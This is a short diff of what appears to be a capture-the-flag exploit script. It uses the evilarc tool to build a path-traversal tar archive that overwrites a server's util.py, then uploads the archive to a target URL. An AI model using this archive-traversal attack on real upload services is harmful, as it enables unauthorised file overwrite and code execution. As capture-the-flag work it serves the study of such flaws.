@@ -23,7 +23,7 @@ def extract_from_archive(file):
 
 open('util.py','w').write(util)
 path_evilary = '~/evilarc/evilarc.py' # change  this
-os.system('rm flag.tar.gz ; python2 %s -d 3 -o u -f flag.tar.gz util.py'%path_evilary)
+os.system('python2 %s -d 3 -o u -f flag.tar.gz util.py'%path_evilary)
 s.post(url,files={'file':open('flag.tar.gz','rb')})
 time.sleep(2)
 res = s.post(url,files={'file':open('flag.tar.gz','rb')}).text
